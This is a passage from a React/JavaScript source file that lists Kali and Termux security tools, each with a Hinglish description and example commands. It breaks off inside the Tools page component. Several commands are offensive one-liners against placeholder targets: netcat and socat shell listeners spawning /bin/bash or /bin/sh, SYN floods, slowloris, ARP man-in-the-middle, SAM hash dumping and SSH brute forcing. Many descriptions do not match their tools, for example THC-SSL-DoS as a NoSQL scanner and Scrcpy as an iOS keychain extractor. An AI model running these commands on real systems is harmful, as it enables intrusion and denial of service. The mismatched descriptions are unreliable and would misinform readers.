    commands: ['httrack --help', 'httrack -v', 'httrack http://target.com -O ./mirror --robots=0 -v'],
    description: 'Web parameter pollution aur HTTP verb tampering. Iske liye HTTrack ek advanced request manipulation toolkit hai.',
  },
  {
    name: 'JoomScan',
    slug: 'joomscan',
    category: 'Web',
    commands: ['joomscan --help', 'joomscan -v', 'joomscan --url https://target.com --enumerate-components'],
    description: 'Web server-side template injection aur SSTI vulnerability detection. Iske liye JoomScan ek specialized template scanner hai.',
  },
  {
    name: 'jSQL Injection',
    slug: 'jsql',
    category: 'Web',
    commands: ['jsql --help', 'jsql -v', 'java -jar jsql-injection.jar -u "http://target.com/page.php?id=1" -m GET'],
    description: 'Ek specialized scanner — web file upload vulnerability testing aur exploitation ke liye.',
  },
  {
    name: 'Katana',
    slug: 'katana',
    category: 'Web',
    commands: ['katana --help', 'katana -v', 'katana -u http://target.com -d 3 -o urls.txt'],
    description: 'Web application firewall bypass aur security testing. Katana advanced toolkit in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Nikto',
    slug: 'nikto',
    category: 'Web',
    commands: ['nikto --help', 'nikto -v', 'nikto -h http://target.com -ssl -Format html -o nikto.html'],
    description: 'Nikto — web server scanner. Termux Android par vulnerability scanning.',
  },
  {
    name: 'Nuclei',
    slug: 'nuclei',
    category: 'Web',
    commands: ['nuclei --help', 'nuclei -v', 'nuclei -u http://target.com -severity critical,high -o vulns.txt'],
    description: 'Nuclei — template-based vulnerability scanner. Termux Android par bhi chalayein.',
  },
  {
    name: 'SidGuess',
    slug: 'sidguess',
    category: 'Web',
    commands: ['sidguess --help', 'sidguess -v', 'sidguess -i 192.168.1.10 -d ORCL -p 1521'],
    description: 'Ek practical load testing tool — web rate limiting bypass aur API throttle evasion testing ke liye.',
  },
  {
    name: 'Skipfish',
    slug: 'skipfish',
    category: 'Web',
    commands: ['skipfish --help', 'skipfish -v', 'skipfish -o /tmp/skipfish -S /usr/share/skipfish/dictionaries/ -W wordlist.txt http://target.com'],
    description: 'Web LDAP injection aur directory service attack execution. Iske liye Skipfish ek comprehensive backend security tool hai.',
  },
  {
    name: 'Slowloris',
    slug: 'slowloris',
    category: 'Web',
    commands: ['slowloris --help', 'slowloris -v', 'slowloris -s 500 -p 80 target.com'],
    description: 'Web CRLF injection aur HTTP response splitting. Slowloris advanced header manipulation framework in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Sqlmap',
    slug: 'sqlmap',
    category: 'Web',
    commands: ['sqlmap --help', 'sqlmap -v', 'sqlmap -u "http://target.com/page.php?id=1" --batch --dbs -o'],
    description: 'SQL injection automation tool. Termux Android par bhi use karein — Sqlmap iske liye kaam aata hai.',
  },
  {
    name: 'Sqlninja',
    slug: 'sqlninja',
    category: 'Web',
    commands: ['sqlninja --help', 'sqlninja -v', 'sqlninja -m http -t http://target.com/page.php?id=1 -f config.conf'],
    description: 'Web deadlink detection aur broken access control testing. Iske liye Sqlninja ek comprehensive tool hai.',
  },
  {
    name: 'SQLSus',
    slug: 'sqlsus',
    category: 'Web',
    commands: ['sqlsus --help', 'sqlsus -v', 'sqlsus -u "http://target.com/page.php?id=1" -o sqlsus.conf'],
    description: 'Web component analysis aur dependency vulnerability scanning ke liye SQLSus ek reliable utility ke roop mein use hota hai.',
  },
  {
    name: 'THC-SSL-DoS',
    slug: 'thc-ssl-dos',
    category: 'Web',
    commands: ['thc-ssl-dos --help', 'thc-ssl-dos -v', 'thc-ssl-dos -l 500 target.com 443 --accept'],
    description: 'Web NoSQL injection aur MongoDB query manipulation testing ke liye THC-SSL-DoS ek modern database scanner ke roop mein use hota hai.',
  },
  {
    name: 'Wafw00f',
    slug: 'wafw00f',
    category: 'Web',
    commands: ['wafw00f --help', 'wafw00f -v', 'wafw00f https://target.com -a'],
    description: 'Web cache poisoning aur request smuggling testing ke liye Wafw00f ek advanced tool ke roop mein use hota hai.',
  },
  {
    name: 'Wapiti',
    slug: 'wapiti',
    category: 'Web',
    commands: ['wapiti --help', 'wapiti -v', 'wapiti -u http://target.com --scope folder -o /tmp/wapiti'],
    description: 'Web DOM-based XSS detection aur client-side attack vector analysis. Wapiti advanced JavaScript scanner in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'WebSploit',
    slug: 'websploit',
    category: 'Web',
    commands: ['websploit --help', 'websploit -v', 'websploit --url=http://target.com --scan'],
    description: 'Web CORS misconfiguration testing aur cross-origin vulnerability detection. Iske liye WebSploit ek specialized security scanner hai.',
  },
  {
    name: 'WFuzz',
    slug: 'wfuzz',
    category: 'Web',
    commands: ['wfuzz --help', 'wfuzz -v', 'wfuzz -c -z file,wordlist.txt --hc 404 http://target.com/FUZZ'],
    description: 'WFuzz ek efficient tool hai jo web login brute forcing aur authentication testing mein help karta hai.',
  },
  {
    name: 'WhatWeb',
    slug: 'whatweb',
    category: 'Web',
    commands: ['whatweb --help', 'whatweb -v', 'whatweb -v https://target.com --log-verbose=whatweb.log'],
    description: 'Web SMTP header injection aur email spoofing vulnerability detection ke liye WhatWeb ek specialized mail utility ke roop mein use hota hai.',
  },
  {
    name: 'Wpscan',
    slug: 'wpscan',
    category: 'Web',
    commands: ['wpscan --help', 'wpscan -v', 'wpscan --url https://target.com --enumerate u,vp --api-token API_KEY'],
    description: 'Termux Android par WordPress security testing. Wpscan wordpress vulnerability scanner ke liye use karein.',
  },
  {
    name: 'ACE-VoIP',
    slug: 'ace-voip',
    category: 'Passwords',
    commands: ['ace-voip --help', 'ace-voip -v', 'ace-voip -i eth0 -r capture.pcap -c SIP'],
    description: 'Cross-platform password hash extraction aur shadow file analysis ke liye ACE-VoIP ek comprehensive credential hunter ke roop mein use hota hai.',
  },
  {
    name: 'Cewl',
    slug: 'cewl',
    category: 'Passwords',
    commands: ['cewl --help', 'cewl -v', 'cewl -d 3 -m 6 -w words.txt https://target.com'],
    description: 'Cewl ek specialized utility hai jo password pattern analysis aur rainbow table lookup mein help karta hai.',
  },
  {
    name: 'CmosPwd',
    slug: 'cmospwd',
    category: 'Passwords',
    commands: ['cmospwd --help', 'cmospwd -v', 'cmospwd /dev/mem 0x70'],
    description: 'Online password attack execution aur service authentication testing. CmosPwd advanced toolkit in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'CredDump',
    slug: 'creddump',
    category: 'Passwords',
    commands: ['creddump --help', 'creddump -v', 'python3 creddump.py /mnt/hive/SYSTEM /mnt/hive/SAM'],
    description: 'Mantra-based password guessing aur personal information pattern detection ke liye CredDump ek intelligent cracking tool ke roop mein use hota hai.',
  },
  {
    name: 'Crunch',
    slug: 'crunch',
    category: 'Passwords',
    commands: ['crunch --help', 'crunch -v', 'crunch 8 12 abc123 -o passlist.txt'],
    description: 'SSH private key passphrase cracking aur encrypted key file recovery. Iske liye Crunch ek specialized cryptographic utility hai.',
  },
  {
    name: 'FindMyHash',
    slug: 'findmyhash',
    category: 'Passwords',
    commands: ['findmyhash --help', 'findmyhash -v', 'findmyhash MD5 -h 5f4dcc3b5aa765d61d8327deb882cf99'],
    description: 'PDF owner password removal aur document restriction bypass ke liye FindMyHash ek specialized document security tool ke roop mein use hota hai.',
  },
  {
    name: 'Hashcat',
    slug: 'hashcat',
    category: 'Passwords',
    commands: ['hashcat --help', 'hashcat -v', 'hashcat -m 0 -a 0 hash.txt rockyou.txt -O -w 4'],
    description: 'Password complexity verification aur strength assessment. Hashcat essential scanner in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Hydra',
    slug: 'hydra',
    category: 'Passwords',
    commands: ['hydra --help', 'hydra -v', 'hydra -l admin -P wordlist.txt ssh://192.168.1.10 -V -f'],
    description: 'Termux Android par password brute forcing. Hydra fast network login cracker ke liye use karein.',
  },
  {
    name: 'John',
    slug: 'john',
    category: 'Passwords',
    commands: ['john --help', 'john -v', 'john --wordlist=rockyou.txt hash.txt --format=raw-md5'],
    description: 'Termux Android aur Kali dono mein available. John password hash cracking tool ke liye use karein.',
  },
  {
    name: 'Maskprocessor',
    slug: 'maskprocessor',
    category: 'Passwords',
    commands: ['maskprocessor --help', 'maskprocessor -v', 'mp64 -1 ?l?d pass?1?1?1?1?1?1 > wordlist.txt'],
    description: 'ZIP/RAR archive password recovery aur encrypted file extraction ke liye Maskprocessor ek reliable archive cracking utility ke roop mein use hota hai.',
  },
  {
    name: 'Medusa',
    slug: 'medusa',
    category: 'Passwords',
    commands: ['medusa --help', 'medusa -v', 'medusa -h 192.168.1.10 -u admin -P pass.txt -M ssh'],
    description: 'Password database auditing aur credential recovery. Iske liye Medusa ek reliable toolkit hai.',
  },
  {
    name: 'Onesixtyone',
    slug: 'onesixtyone',
    category: 'Passwords',
    commands: ['onesixtyone --help', 'onesixtyone -v', 'onesixtyone -c community.txt -i targets.txt -o snmp.txt'],
    description: 'Kerberos ticket cracking aur TGS-REP hash offline analysis. Iske liye Onesixtyone ek advanced AD password utility hai.',
  },
  {
    name: 'PACK',
    slug: 'pack',
    category: 'Passwords',
    commands: ['pack --help', 'pack -v', 'python3 rulegen.py --input hash.txt --output rules.rule'],
    description: 'Password policy auditing aur weak credential detection. Iske liye PACK ek effective utility hai.',
  },
  {
    name: 'PDFCrack',
    slug: 'pdfcrack',
    category: 'Passwords',
    commands: ['pdfcrack --help', 'pdfcrack -v', 'pdfcrack -f encrypted.pdf -w wordlist.txt'],
    description: 'Custom wordlist creation aur password mutation testing ke liye PDFCrack ek versatile generator ke roop mein use hota hai.',
  },
  {
    name: 'Pipal',
    slug: 'pipal',
    category: 'Passwords',
    commands: ['pipal --help', 'pipal -v', 'pipal wordlist.txt -o analysis.html'],
    description: 'Credential stuffing testing aur password spraying automation ke liye Pipal ek reliable framework ke roop mein use hota hai.',
  },
  {
    name: 'Pyrit',
    slug: 'pyrit',
    category: 'Passwords',
    commands: ['pyrit --help', 'pyrit -v', 'pyrit -r capture.cap -i wordlist.txt attack_passthrough'],
    description: 'Ek specialized utility — key derivation function analysis aur password hash benchmarking ke liye.',
  },
  {
    name: 'RainbowCrack',
    slug: 'rainbowcrack',
    category: 'Passwords',
    commands: ['rainbowcrack --help', 'rainbowcrack -v', 'rtgen md5 numeric 1-8 0 8000 5000 0'],
    description: 'Ek powerful framework — rule-based password cracking aur hybrid attack execution ke liye.',
  },
  {
    name: 'SamDump2',
    slug: 'samdump2',
    category: 'Passwords',
    commands: ['samdump2 --help', 'samdump2 -v', 'samdump2 system SAM > hashes.txt'],
    description: 'Wifi PMKID hash capture aur WPA/WPA2 handshake extraction. Iske liye SamDump2 ek wireless password framework hai.',
  },
  {
    name: 'SipCrack',
    slug: 'sipcrack',
    category: 'Passwords',
    commands: ['sipcrack --help', 'sipcrack -v', 'sipcrack -w wordlist.txt sip.dump'],
    description: 'Hash comparison aur password candidate generation ke liye SipCrack ek professional tool ke roop mein use hota hai.',
  },
  {
    name: 'Sucrack',
    slug: 'sucrack',
    category: 'Passwords',
    commands: ['sucrack --help', 'sucrack -v', 'sucrack -w wordlist.txt -t 4 user@localhost'],
    description: 'WordPress admin password brute forcing aur wp-login testing. Iske liye Sucrack ek popular CMS credential scanner hai.',
  },
  {
    name: 'Twofi',
    slug: 'twofi',
    category: 'Passwords',
    commands: ['twofi --help', 'twofi -v', 'twofi -d "Twitter Account" -o words.txt'],
    description: 'LM/NTML hash extraction aur Windows credential analysis ke liye Twofi ek specialized corporate password tool ke roop mein use hota hai.',
  },
  {
    name: 'Wordlists',
    slug: 'wordlists',
    category: 'Passwords',
    commands: ['wordlists --help', 'wordlists -v', 'ls /usr/share/wordlists/ && cat rockyou.txt | head -100'],
    description: 'Ek powerful multi-algorithm tool — hash analysis aur password recovery ke liye.',
  },
  {
    name: 'Bettercap',
    slug: 'bettercap',
    category: 'Network',
    commands: ['bettercap --help', 'bettercap -v', 'bettercap -T -M arp:remote /192.168.1.1/ /192.168.1.10/ -w capture.pcap'],
    description: 'MiTM attacks aur network monitoring. Termux Android mein bhi chalayein — Bettercap iske liye kaam aata hai.',
  },
  {
    name: 'DHCPig',
    slug: 'dhcpig',
    category: 'Network',
    commands: ['dhcpig --help', 'dhcpig -v', 'dhcpig -f /tmp/dhcp.pig -t 100'],
    description: 'ARP cache poisoning aur dynamic host tracking. DHCPig practical Layer 2 reconnaissance framework in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Ettercap',
    slug: 'ettercap',
    category: 'Network',
    commands: ['ettercap --help', 'ettercap -v', 'ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.10/ -w capture.pcap'],
    description: 'Network forensics aur traffic log analysis. Iske liye Ettercap ek reliable investigative utility hai.',
  },
  {
    name: 'Ferret',
    slug: 'ferret',
    category: 'Network',
    commands: ['ferret --help', 'ferret -v', 'ferret -i eth0 -p ferret.log'],
    description: 'Ek advanced toolkit — traffic interception aur man-in-the-middle attack implementation ke liye.',
  },
  {
    name: 'Hamster',
    slug: 'hamster',
    category: 'Network',
    commands: ['hamster --help', 'hamster -v', 'hamster -i ferret.log'],
    description: 'Network authentication testing aur credential interception ke liye Hamster ek specialized toolkit ke roop mein use hota hai.',
  },
  {
    name: 'HexInject',
    slug: 'hexinject',
    category: 'Network',
    commands: ['hexinject --help', 'hexinject -v', 'hexinject -i eth0 -P -p payload.bin'],
    description: 'Ek professional tool — network connection tracking aur session analysis ke liye.',
  },
  {
    name: 'Hping3',
    slug: 'hping3',
    category: 'Network',
    commands: ['hping3 --help', 'hping3 -v', 'hping3 -S target.com -p 80 --flood'],
    description: 'Hping3 ek reliable network resource tool hai jo DHCP starvation aur rogue DHCP server detection mein help karta hai.',
  },
  {
    name: 'InviteFlood',
    slug: 'inviteflood',
    category: 'Network',
    commands: ['inviteflood --help', 'inviteflood -v', 'inviteflood eth0 100.0.0.1 200.0.0.1 5000'],
    description: 'Network layer attack implementation aur protocol exploitation. Iske liye InviteFlood ek advanced tool hai.',
  },
  {
    name: 'Mitmproxy',
    slug: 'mitmproxy',
    category: 'Network',
    commands: ['mitmproxy --help', 'mitmproxy -v', 'mitmproxy --mode transparent --showhost -p 8080'],
    description: 'Mitmproxy ek versatile security tool hai jo packet generation aur network stress testing mein help karta hai.',
  },
  {
    name: 'Netcat',
    slug: 'netcat',
    category: 'Network',
    commands: ['netcat --help', 'netcat -v', 'nc -lvnp 4444 -e /bin/bash'],
    description: 'Network Swiss army knife. Termux Android par networking aur debugging — Netcat iske liye kaam aata hai.',
  },
  {
    name: 'Netsniff-ng',
    slug: 'netsniff-ng',
    category: 'Network',
    commands: ['netsniff-ng --help', 'netsniff-ng -v', 'netsniff-ng -i eth0 -o dump.pcap -b 0'],
    description: 'Netsniff-ng ek professional utility hai jo network tunneling detection aur traffic anomaly analysis mein help karta hai.',
  },
  {
    name: 'Rebind',
    slug: 'rebind',
    category: 'Network',
    commands: ['rebind --help', 'rebind -v', 'rebind -d target.com -a 10.0.0.5 -p 80'],
    description: 'VPN protocol analysis aur IPSec tunnel testing. Iske liye Rebind ek advanced encrypted network tool hai.',
  },
  {
    name: 'Responder',
    slug: 'responder',
    category: 'Network',
    commands: ['responder --help', 'responder -v', 'responder -I eth0 -rdwv -f --lm'],
    description: 'Ek fast reconnaissance tool — network service enumeration aur banner grabbing ke liye.',
  },
  {
    name: 'SniffJoke',
    slug: 'sniffjoke',
    category: 'Network',
    commands: ['sniffjoke --help', 'sniffjoke -v', 'sniffjoke -i eth0 --blacklist targets.txt'],
    description: 'Network sniffing aur real-time traffic visualization. Iske liye SniffJoke ek powerful framework hai.',
  },
  {
    name: 'T50',
    slug: 't50',
    category: 'Network',
    commands: ['t50 --help', 't50 -v', 't50 10.0.0.1 --flood --syn -p 80 -c 10000'],
    description: 'T50 ek reliable solution hai jo network bandwidth monitoring aur protocol debugging mein help karta hai.',
  },
  {
    name: 'Tcpdump',
    slug: 'tcpdump',
    category: 'Network',
    commands: ['tcpdump --help', 'tcpdump -v', 'tcpdump -i eth0 -n -s0 -X -w capture.pcap "port 80"'],
    description: 'Termux Android mein bhi available. Tcpdump packet analysis aur network debugging ke liye use karein.',
  },
  {
    name: 'TCPFlow',
    slug: 'tcpflow',
    category: 'Network',
    commands: ['tcpflow --help', 'tcpflow -v', 'tcpflow -i eth0 -o /tmp/flow "port 80"'],
    description: 'Network packet crafting aur traffic manipulation. TCPFlow versatile utility in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Wireshark',
    slug: 'wireshark',
    category: 'Network',
    commands: ['wireshark --help', 'wireshark -v', 'wireshark -i eth0 -k -Y "http.request" -w capture.pcapng'],
    description: 'Wireshark — network protocol analyzer. Termux Android par tshark ke saath use karein.',
  },
  {
    name: 'Yersinia',
    slug: 'yersinia',
    category: 'Network',
    commands: ['yersinia --help', 'yersinia -v', 'yersinia -I -G'],
    description: 'Network segmentation testing aur access control verification. Yersinia comprehensive scanner in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Autopsy',
    slug: 'autopsy',
    category: 'Forensics',
    commands: ['autopsy --help', 'autopsy -v', 'autopsy --db autopsy.db -d /mnt/evidence/case1/'],
    description: 'Log file correlation aur security event timeline reconstruction. Autopsy professional SIEM forensics tool in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Binwalk',
    slug: 'binwalk',
    category: 'Forensics',
    commands: ['binwalk --help', 'binwalk -v', 'binwalk -Me firmware.bin -o extracted/'],
    description: 'Ek specialized investigation utility — memory forensics aur volatile data acquisition ke liye.',
  },
  {
    name: 'Capstone',
    slug: 'capstone',
    category: 'Forensics',
    commands: ['capstone --help', 'capstone -v', 'python3 -c "from capstone import *; md = Cs(CS_ARCH_X86, CS_MODE_64); md.disasm(code, 0x1000)"'],
    description: 'Email forensics aur message header analysis. Iske liye Capstone ek reliable digital communication investigator hai.',
  },
  {
    name: 'DC3DD',
    slug: 'dc3dd',
    category: 'Forensics',
    commands: ['dc3dd --help', 'dc3dd -v', 'dc3dd if=/dev/sda of=/mnt/evidence/disk.img hash=sha256'],
    description: 'File carving aur deleted data recovery ke liye DC3DD ek powerful digital analysis tool ke roop mein use hota hai.',
  },
  {
    name: 'Dex2Jar',
    slug: 'dex2jar',
    category: 'Forensics',
    commands: ['dex2jar --help', 'dex2jar -v', 'd2j-dex2jar.sh classes.dex -o app.jar'],
    description: 'Network packet forensics aur communication reconstruction ke liye Dex2Jar ek specialized analyzer ke roop mein use hota hai.',
  },
  {
    name: 'EDB Debugger',
    slug: 'edb-debugger',
    category: 'Forensics',
    commands: ['edb-debugger --help', 'edb-debugger -v', 'edb --run /tmp/binary --debug'],
    description: 'Stealth file detection aur hidden data identification. Iske liye EDB Debugger ek specialized scanner hai.',
  },
  {
    name: 'Foremost',
    slug: 'foremost',
    category: 'Forensics',
    commands: ['foremost --help', 'foremost -v', 'foremost -t jpg,png,pdf -i disk.img -o output/'],
    description: 'Browser forensics aur web history reconstruction ke liye Foremost ek specialized digital evidence collector ke roop mein use hota hai.',
  },
  {
    name: 'Ghidra',
    slug: 'ghidra',
    category: 'Forensics',
    commands: ['ghidra --help', 'ghidra -v', 'ghidra ProjectName -import binary.exe -overwrite'],
    description: 'Ek comprehensive toolkit — document forensics aur embedded object analysis ke liye.',
  },
  {
    name: 'Guymager',
    slug: 'guymager',
    category: 'Forensics',
    commands: ['guymager --help', 'guymager -v', 'guymager --gui --dd /dev/sda --file disk.dd'],
    description: 'Guymager ek reliable integrity checker hai jo disk clone verification aur forensic hash validation mein help karta hai.',
  },
  {
    name: 'Iaito',
    slug: 'iaito',
    category: 'Forensics',
    commands: ['iaito --help', 'iaito -v', 'iaito -f binary.exe -a x86'],
    description: 'Anti-forensics detection aur data wiping identification. Iaito advanced tamper evidence scanner in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'JD-GUI',
    slug: 'jd-gui',
    category: 'Forensics',
    commands: ['jd-gui --help', 'jd-gui -v', 'jd-gui app.jar'],
    description: 'Database forensics aur SQLite record recovery. JD-GUI reliable structured data analysis utility in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Keystone',
    slug: 'keystone',
    category: 'Forensics',
    commands: ['keystone --help', 'keystone -v', 'python3 -c "from keystone import *; ks = Ks(KS_ARCH_X86, KS_MODE_64); ks.asm(\"inc eax\")"'],
    description: 'Timeline analysis aur file system journal examination. Iske liye Keystone ek professional utility hai.',
  },
  {
    name: 'PCredz',
    slug: 'pcredz',
    category: 'Forensics',
    commands: ['pcredz --help', 'pcredz -v', 'python3 Pcredz -i eth0 -v -o credentials.txt'],
    description: 'Container forensics aur Docker image analysis. PCredz specialized cloud-native investigation utility in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'PDF-Parser',
    slug: 'pdf-parser',
    category: 'Forensics',
    commands: ['pdf-parser --help', 'pdf-parser -v', 'python3 pdf-parser.py --stats malicious.pdf'],
    description: 'Digital evidence collection aur file system analysis ke liye PDF-Parser ek professional forensics tool ke roop mein use hota hai.',
  },
  {
    name: 'PhotoRec',
    slug: 'photorec',
    category: 'Forensics',
    commands: ['photorec --help', 'photorec -v', 'photorec /log /d output/disk.img'],
    description: 'Metadata extraction aur file property analysis. PhotoRec practical forensics utility in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Radare2',
    slug: 'radare2',
    category: 'Forensics',
    commands: ['radare2 --help', 'radare2 -v', 'r2 -A -q binary.exe -c "afl; afl~syscall"'],
    description: 'Disk imaging aur storage media forensic analysis. Radare2 comprehensive toolkit in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Scalpel',
    slug: 'scalpel',
    category: 'Forensics',
    commands: ['scalpel --help', 'scalpel -v', 'scalpel -c scalpel.conf -o output/ disk.img'],
    description: 'USB device history analysis aur removable storage forensics. Scalpel comprehensive external device tool in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Sleuth Kit',
    slug: 'sleuthkit',
    category: 'Forensics',
    commands: ['sleuthkit --help', 'sleuthkit -v', 'fls -r -o 2048 disk.img | mactime -d -b /tmp/body.txt'],
    description: 'Executable packing detection aur code unpacking ke liye Sleuth Kit ek advanced reverse engineering tool ke roop mein use hota hai.',
  },
  {
    name: 'Smali/Baksmali',
    slug: 'smali',
    category: 'Forensics',
    commands: ['smali --help', 'smali -v', 'java -jar smali.jar a smali_out/ -o classes.dex'],
    description: 'Binary analysis aur executable inspection. Iske liye Smali/Baksmali ek advanced reverse engineering tool hai.',
  },
  {
    name: 'TestDisk',
    slug: 'testdisk',
    category: 'Forensics',
    commands: ['testdisk --help', 'testdisk -v', 'testdisk /log disk.img'],
    description: 'File system timeline analysis aur deletion artifact recovery. Iske liye TestDisk ek professional utility hai.',
  },
  {
    name: 'Volatility',
    slug: 'volatility',
    category: 'Forensics',
    commands: ['volatility --help', 'volatility -v', 'volatility -f memory.dump imageinfo && volatility -f memory.dump --profile=Win10x64 pslist'],
    description: 'Volatility ek comprehensive platform hai jo forensic report generation aur evidence chain-of-custody logging mein help karta hai.',
  },
  {
    name: 'Xplico',
    slug: 'xplico',
    category: 'Forensics',
    commands: ['xplico --help', 'xplico -v', 'xplico --interface eth0 --pcap capture.pcap'],
    description: 'Ek advanced digital identity toolkit — social media forensics aur online account data extraction ke liye.',
  },
  {
    name: 'ADB',
    slug: 'adb',
    category: 'Mobile',
    commands: ['adb --help', 'adb -v', 'adb shell -s device_id shell pm list packages'],
    description: 'Mobile credential storage analysis aur secure storage auditing. Iske liye ADB ek reliable utility hai.',
  },
  {
    name: 'Android Framework Tools',
    slug: 'android-framework',
    category: 'Mobile',
    commands: ['android-framework --help', 'android-framework -v', 'apktool d app.apk -o decompiled/'],
    description: 'Android Framework Tools ek powerful mobile forensics tool hai jo APK decompilation aur source code analysis mein help karta hai.',
  },
  {
    name: 'Apktool',
    slug: 'apktool',
    category: 'Mobile',
    commands: ['apktool --help', 'apktool -v', 'apktool d app.apk -o decompiled_app/'],
    description: 'Apktool ek practical utility hai jo Android backup analysis aur application data extraction mein help karta hai.',
  },
  {
    name: 'Dex2Smali',
    slug: 'dex2smali',
    category: 'Mobile',
    commands: ['dex2smali --help', 'dex2smali -v', 'java -jar baksmali.jar d classes.dex -o smali_out/'],
    description: 'Android intent fuzzing aur inter-component communication testing ke liye Dex2Smali ek specialized scanner ke roop mein use hota hai.',
  },
  {
    name: 'Drozer',
    slug: 'drozer',
    category: 'Mobile',
    commands: ['drozer --help', 'drozer -v', 'drozer console connect -s tcp:192.168.1.10:31415'],
    description: 'Drozer ek advanced toolkit hai jo mobile penetration testing aur iOS application security assessment mein help karta hai.',
  },
  {
    name: 'Fastboot',
    slug: 'fastboot',
    category: 'Mobile',
    commands: ['fastboot --help', 'fastboot -v', 'fastboot flash recovery twrp.img'],
    description: 'Ek comprehensive mobile web tool — Android WebView vulnerability testing aur XSS attack simulation ke liye.',
  },
  {
    name: 'Firmware Mod Kit',
    slug: 'firmware-mod',
    category: 'Mobile',
    commands: ['firmware-mod --help', 'firmware-mod -v', 'python3 firmadyne/extractImages.py firmware.bin'],
    description: 'Ek specialized mobile testing framework — Android broadcast receiver analysis aur intent-based attack execution ke liye.',
  },
  {
    name: 'Frida',
    slug: 'frida',
    category: 'Mobile',
    commands: ['frida --help', 'frida -v', 'frida-ps -U -a && frida -U -f com.app.pkg -l script.js'],
    description: 'IOS plist file analysis aur application preference extraction. Frida practical Apple forensics tool in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Mkbootimg',
    slug: 'mkbootimg',
    category: 'Mobile',
    commands: ['mkbootimg --help', 'mkbootimg -v', 'mkbootimg --kernel kernel.img --ramdisk ramdisk.img --output boot.img'],
    description: 'Mobile network traffic interception aur application communication analysis ke liye Mkbootimg ek versatile toolkit ke roop mein use hota hai.',
  },
  {
    name: 'Objection',
    slug: 'objection',
    category: 'Mobile',
    commands: ['objection --help', 'objection -v', 'objection -g com.app.pkg explore'],
    description: 'Mobile application repackaging aur re-signing. Iske liye Objection ek practical utility hai.',
  },
  {
    name: 'Scrcpy',
    slug: 'scrcpy',
    category: 'Mobile',
    commands: ['scrcpy --help', 'scrcpy -v', 'scrcpy -m 1024 --max-fps 30'],
    description: 'Scrcpy ek professional Apple security scanner hai jo iOS keychain analysis aur secure credential storage extraction mein help karta hai.',
  },
  {
    name: 'SignApk',
    slug: 'signapk',
    category: 'Mobile',
    commands: ['signapk --help', 'signapk -v', 'java -jar signapk.jar certificate.pem key.pk8 app.apk signed.apk'],
    description: 'Mobile application hooking aur runtime manipulation. Iske liye SignApk ek powerful dynamic analysis tool hai.',
  },
  {
    name: 'Chisel',
    slug: 'chisel',
    category: 'Tunneling',
    commands: ['chisel --help', 'chisel -v', 'chisel server -p 8000 --reverse && chisel client 10.0.0.5:8000 R:3000:localhost:80'],
    description: 'HTTP tunneling aur web proxy bypass ke liye Chisel ek advanced network toolkit ke roop mein use hota hai.',
  },
  {
    name: 'Dns2tcp',
    slug: 'dns2tcp',
    category: 'Tunneling',
    commands: ['dns2tcp --help', 'dns2tcp -v', 'dns2tcpc -z dns.example.com -l 8888 -r 10.0.0.5 -k password'],
    description: 'Encrypted tunnel creation aur secure data transmission. Dns2tcp practical tool in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Dnscat2',
    slug: 'dnscat2',
    category: 'Tunneling',
    commands: ['dnscat2 --help', 'dnscat2 -v', 'dnscat2 --dns domain=example.com --no-cache'],
    description: 'Ek reliable tunneling tool — network traffic encapsulation aur proxy chain configuration ke liye.',
  },
  {
    name: 'HTTPTunnel',
    slug: 'httptunnel',
    category: 'Tunneling',
    commands: ['httptunnel --help', 'httptunnel -v', 'hts -F localhost:8080 80 && htc -F 8888 10.0.0.5'],
    description: 'HTTPTunnel ek specialized toolkit hai jo multi-hop proxy chaining aur anonymous routing mein help karta hai.',
  },
  {
    name: 'Proxychains',
    slug: 'proxychains',
    category: 'Tunneling',
    commands: ['proxychains --help', 'proxychains -v', 'proxychains nmap -sT -Pn -p 80,443 target.com'],
    description: 'ICMP tunneling aur ping-based data exfiltration. Proxychains advanced covert channel tool in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Pwnat',
    slug: 'pwnat',
    category: 'Tunneling',
    commands: ['pwnat --help', 'pwnat -v', 'pwnat -s 10.0.0.5:2222 -c target.com:80'],
    description: 'WebSocket tunneling aur bidirectional encrypted communication. Pwnat modern protocol wrapper in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Socat',
    slug: 'socat',
    category: 'Tunneling',
    commands: ['socat --help', 'socat -v', 'socat TCP-LISTEN:4444,fork EXEC:/bin/sh'],
    description: 'TLS/SSL interception aur encrypted traffic analysis ke liye Socat ek reliable man-in-the-middle tunneling utility ke roop mein use hota hai.',
  },
  {
    name: 'Stunnel',
    slug: 'stunnel',
    category: 'Tunneling',
    commands: ['stunnel --help', 'stunnel -v', 'stunnel /etc/stunnel/stunnel.conf'],
    description: 'Protocol tunneling aur traffic obfuscation. Stunnel comprehensive framework in sabhi tasks ko handle karta hai.',
  },
  {
    name: 'Lynis',
    slug: 'lynis',
    category: 'Audit',
    commands: ['lynis --help', 'lynis -v', 'lynis audit system --quiet --log-file /tmp/lynis.log'],
    description: 'Ek comprehensive automation framework — system security auditing aur compliance checking ke liye.',
  },
  {
    name: 'Trivy',
    slug: 'trivy',
    category: 'Audit',
    commands: ['trivy --help', 'trivy -v', 'trivy image nginx:latest --severity CRITICAL,HIGH --output json'],
    description: 'Docker container security audit aur image vulnerability scanning. Trivy modern devops compliance tool in sabhi tasks ko handle karta hai.',
  },
]





const TOOLS_PER_PAGE = 30
const categories = ['All', ...new Set(tools.map(t => t.category))]

export default function Tools() {
  const [selectedCategory, setSelectedCategory] = useState('All')
  const [searchTerm, setSearchTerm] = useState('')
  const [currentPage, setCurrentPage] = useState(1)

  const filteredTools = tools.filter(tool => {
    const matchesCategory = selectedCategory === 'All' || tool.category === selectedCategory
